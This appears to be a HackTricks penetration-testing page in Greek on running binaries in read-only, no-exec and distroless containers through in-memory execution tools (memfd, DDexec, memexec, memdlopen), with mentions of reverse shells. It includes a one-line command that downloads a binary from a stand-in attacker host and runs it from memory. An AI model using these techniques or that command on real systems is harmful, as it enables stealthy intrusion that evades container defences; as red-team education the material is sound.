# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Βίντεο

Στα παρακάτω βίντεο θα βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα εξηγημένες πιο αναλυτικά:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec σενάριο

Γίνεται όλο και πιο συνηθισμένο να βρίσκουμε μηχανές linux προσαρτημένες με **read-only (ro) file system protection**, ειδικά σε containers. Αυτό συμβαίνει γιατί για να τρέξει ένα container με ro file system αρκεί να ορίσετε **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμα κι αν το file system είναι προσαρτημένο ως ro, **`/dev/shm`** παραμένει εγγράψιμο, οπότε δεν ισχύει ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Παρ' όλα αυτά, αυτός ο φάκελος θα είναι **mounted with no-exec protection**, οπότε αν κατεβάσετε ένα binary εδώ **δεν θα μπορείτε να το εκτελέσετε**.

> [!WARNING]
> Από την πλευρά του red team, αυτό καθιστά **περίπλοκο το να κατεβάσετε και να εκτελέσετε** binaries που δεν υπάρχουν ήδη στο σύστημα (όπως backdoors ή εργαλεία enumerators όπως `kubectl`).

## Πιο εύκολο bypass: Scripts

Σημειώστε ότι αναφέρθηκα σε binaries — μπορείτε να **εκτελέσετε οποιοδήποτε script** όσο ο interpreter υπάρχει στο μηχάνημα, π.χ. **shell script** αν υπάρχει `sh` ή **python script** αν είναι εγκατεστημένο το `python`.

Ωστόσο, αυτό δεν αρκεί για να εκτελέσετε το binary backdoor σας ή άλλα binary εργαλεία που μπορεί να χρειαστείτε.

## Memory Bypasses

Αν θέλετε να εκτελέσετε ένα binary αλλά το file system δεν το επιτρέπει, ο καλύτερος τρόπος είναι να το **εκτελέσετε από τη μνήμη**, επειδή οι **προστασίες δεν ισχύουν εκεί**.

### FD + exec syscall bypass

Αν έχετε μέσα στο μηχάνημα ισχυρά script engines όπως **Python**, **Perl**, ή **Ruby**, μπορείτε να κατεβάσετε το binary για εκτέλεση από τη μνήμη, να το αποθηκεύσετε σε έναν memory file descriptor (`create_memfd` syscall), ο οποίος δεν θα υπόκειται σε αυτές τις προστασίες, και μετά να καλέσετε ένα **`exec` syscall** δείχνοντας τον **fd ως το αρχείο προς εκτέλεση**.

Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Του περνάτε το binary και θα δημιουργήσει ένα script στη δηλωμένη γλώσσα με το **binary συμπιεσμένο και b64 κωδικοποιημένο** με οδηγίες για να **αποκωδικοποιηθεί και να αποσυμπιεστεί** σε έναν **fd** που δημιουργείται καλώντας το syscall `create_memfd` και μια κλήση στο syscall **exec** για να το τρέξει.

> [!WARNING]
> Αυτό δεν δουλεύει σε άλλες scripting γλώσσες όπως PHP ή Node γιατί δεν έχουν κάποιον **προεπιλεγμένο τρόπο να καλούν raw syscalls** από ένα script, οπότε δεν είναι δυνατό να καλέσετε το `create_memfd` για να δημιουργήσετε το **memory fd** για να αποθηκεύσετε το binary.
>
> Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα δουλέψει, καθώς δεν θα σας επιτραπεί να το τρέξετε επειδή θα εφαρμοστεί η **no-exec προστασία**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της ίδιας σας της διεργασίας** αντικαθιστώντας το **`/proc/self/mem`**.

Συνεπώς, **ελέγχοντας τον assembly κώδικα** που εκτελείται από τη διεργασία, μπορείτε να γράψετε ένα **shellcode** και να "μεταλλάξετε" τη διεργασία ώστε να **εκτελέσει οποιονδήποτε αυθαίρετο κώδικα**.

> [!TIP]
> **DDexec / EverythingExec** σας επιτρέπει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε binary** από τη **μνήμη**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική δείτε το Github ή:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **run a different binary** δεν χρειάζεται να επανεκκινήσετε το DDexec — μπορείτε απλά να τρέξετε memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **communicate with this deamon to pass new binaries to load and run**.

Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε **memexec to execute binaries from a PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **easier way to load binaries** στη μνήμη για να τα εκτελέσετε αργότερα. Μπορεί ακόμη να επιτρέψει τη φόρτωση binaries με dependencies.

## Παράκαμψη Distroless

Για μια αφιερωμένη εξήγηση του **what distroless actually is**, πότε βοηθά, πότε όχι, και πώς αλλάζει το post-exploitation tradecraft στα containers, δείτε:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Τα distroless containers περιέχουν μόνο τα **bare minimum components necessary to run a specific application or service**, όπως βιβλιοθήκες και runtime dependencies, αλλά εξαιρούν μεγαλύτερα components όπως package manager, shell ή system utilities.

Ο στόχος των distroless containers είναι να **reduce the attack surface of containers by eliminating unnecessary components** και να ελαχιστοποιήσει τον αριθμό ευπαθειών που μπορούν να αξιοποιηθούν.

### Reverse Shell

Σε ένα distroless container ίσως **να μην βρείτε καν το `sh` ή το `bash`** για να αποκτήσετε ένα κανονικό shell. Επίσης δεν θα βρείτε binaries όπως `ls`, `whoami`, `id`... όλα όσα συνήθως τρέχετε σε ένα σύστημα.

> [!WARNING]
> Επομένως, **δεν θα** μπορείτε να αποκτήσετε ένα **reverse shell** ή να **enumerate** το σύστημα όπως συνήθως.

Ωστόσο, αν το παραβιασμένο container τρέχει για παράδειγμα ένα flask web, τότε είναι εγκατεστημένο το python, και επομένως μπορείτε να αποκτήσετε ένα **Python reverse shell**. Αν τρέχει node, μπορείτε να αποκτήσετε ένα Node rev shell, και το ίδιο με σχεδόν οποιαδήποτε **scripting language**.

> [!TIP]
> Χρησιμοποιώντας τη scripting language μπορείτε να **enumerate the system** αξιοποιώντας τις δυνατότητες της γλώσσας.

Εάν δεν υπάρχουν προστασίες **`read-only/no-exec`** μπορείτε να καταχραστείτε το reverse shell σας για να **write in the file system your binaries** και να τα **execute**.

> [!TIP]
> Ωστόσο, σε αυτού του είδους τα containers αυτές οι προστασίες συνήθως υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **previous memory execution techniques to bypass them**.

Μπορείτε να βρείτε **examples** για το πώς να **exploit some RCE vulnerabilities** για να αποκτήσετε scripting languages **reverse shells** και να εκτελέσετε binaries από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
